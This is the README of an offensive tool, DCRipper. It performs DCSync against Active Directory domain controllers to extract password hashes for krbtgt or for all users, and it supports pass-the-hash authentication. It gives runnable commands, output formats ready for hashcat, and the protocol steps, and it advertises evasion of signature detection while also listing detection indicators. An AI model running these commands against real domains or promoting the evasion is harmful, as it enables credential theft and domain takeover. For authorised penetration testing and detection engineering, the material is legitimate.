# DCRipper

**DCSync Without Impacket - Zero Dependencies**

A custom implementation of the MS-DRSR (Directory Replication Service Remote Protocol) for extracting Active Directory credentials via the DCSync technique. Built from scratch without using Impacket.

```
  ____   ____ ____  _
 |  _ \ / ___|  _ \(_)_ __  _ __   ___ _ __
 | | | | |   | |_) | | '_ \| '_ \ / _ \ '__|
 | |_| | |___|  _ <| | |_) | |_) |  __/ |
 |____/ \____|_| \_\_| .__/| .__/ \___|_|
                     |_|   |_|
```

## Features

- Pure Python implementation of MS-DRSR protocol
- No Impacket dependency - custom DCE/RPC, NDR, and NTLM implementations
- Dump single user credentials or all domain users
- Multiple output formats: hashcat, pwdump, secretsdump, JSON
- Supports password and NTLM hash authentication
- TCP and SMB transport options

## Requirements

- Python 3.8+
- pycryptodome

```bash
pip install pycryptodome
```

## Usage

### Dump a single user (default: krbtgt)
```bash
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123
```

### Dump a specific user
```bash
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -t administrator
```

### Dump all domain users
```bash
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a
```

### Authenticate with NTLM hash (Pass-the-Hash)
```bash
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -H aad3b435b51404eeaad3b435b51404ee:ntlmhash
```

### Save output to file
```bash
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a -o hashes.txt
```

## Options

| Option | Description |
|--------|-------------|
| `-dc`, `--dc-ip` | IP address or hostname of the domain controller (required) |
| `-d`, `--domain` | Target domain name - NETBIOS or FQDN (required) |
| `-u`, `--username` | Username for authentication (required) |
| `-p`, `--password` | Password for authentication |
| `-H`, `--hashes` | NTLM hash in format `LMHASH:NTHASH` or just `NTHASH` |
| `-t`, `--target` | Target user to dump (default: krbtgt) |
| `-a`, `--all` | Dump all domain users |
| `-o`, `--output` | Output file path |
| `-f`, `--format` | Output format: `hashcat`, `pwdump`, `secretsdump`, `json` |
| `--smb` | Use SMB named pipe transport instead of TCP |
| `--timeout` | Connection timeout in seconds (default: 30) |
| `-v`, `--verbose` | Verbose output |

## Output Formats

### hashcat (default)
```
administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### pwdump
```
DOMAIN\administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### secretsdump
```
DOMAIN\administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### json
```json
{
  "username": "administrator",
  "domain": "DOMAIN",
  "rid": 500,
  "nt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
  "lm_hash": "aad3b435b51404eeaad3b435b51404ee"
}
```

## How It Works

DCRipper implements the MS-DRSR protocol to perform a DCSync attack:

1. **Endpoint Mapping** - Queries the EPM (Endpoint Mapper) on port 135 to find the DRSUAPI service port
2. **NTLM Authentication** - Performs NTLM authentication over DCE/RPC with packet privacy (sealing)
3. **DRS Bind** - Binds to the DRSUAPI interface and obtains a context handle
4. **DC Info** - Retrieves the DC's NtdsDsaObjectGuid via DRSDomainControllerInfo
5. **Name Resolution** - Uses DRSCrackNames to resolve usernames to distinguished names
6. **Replication** - Calls DRSGetNCChanges with EXOP_REPL_SECRETS to replicate password secrets
7. **Decryption** - Decrypts the replicated attributes using the session key (RC4 + DES layers)

For detailed protocol documentation, see [IMPLEMENTATION.md](IMPLEMENTATION.md).

## Project Structure

```
customsync/
├── dcripper.py           # Main entry point
├── config.py             # Configuration and constants
├── transport/
│   ├── tcp.py            # TCP transport layer
│   ├── smb.py            # SMB named pipe transport
│   └── ntlm.py           # NTLM authentication
├── rpc/
│   ├── dcerpc.py         # DCE/RPC client implementation
│   ├── ndr.py            # NDR serialization/deserialization
│   └── epm.py            # Endpoint mapper client
├── drsr/
│   ├── client.py         # High-level DRSR client
│   ├── bind.py           # DRSBind operation
│   ├── getncchanges.py   # DRSGetNCChanges operation
│   ├── cracknames.py     # DRSCrackNames operation
│   ├── dcinfo.py         # DRSDomainControllerInfo operation
│   ├── structures.py     # Data structures
│   └── crypto.py         # Decryption routines
├── parser/
│   └── sid.py            # SID parsing utilities
└── output/
    └── formatter.py      # Output formatting
```

## Detection

DCRipper evades signature-based detection targeting Impacket specifically, but behavior-based detection (monitoring for DCSync activity) will still catch it. The protocol does what it does - there's no way to hide that you're replicating password hashes.

**What makes DCRipper harder to detect:**
- No Impacket code signatures or patterns
- Different network fingerprint from Impacket's implementation
- No well-known pip package dependencies (only pycryptodome)
- Custom RPC implementation

**What's still detectable:**
- Windows Event ID 4662 (Directory Service Access) logs replication requests
- Network monitoring for DCSync behavior (DRSUAPI calls with EXOP_REPL_SECRETS)
- Behavioral analysis detecting replication of sensitive attributes

## Requirements

The account used for authentication must have one of the following privileges:
- Domain Admins
- Enterprise Admins
- Administrators (on DC)
- Or explicit "Replicating Directory Changes All" permission

## Legal Disclaimer

This tool is intended for authorized security testing, penetration testing engagements, and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## License

MIT License

## Credits

Built by studying the MS-DRSR, MS-RPCE, and MS-SAMR protocol specifications from Microsoft.
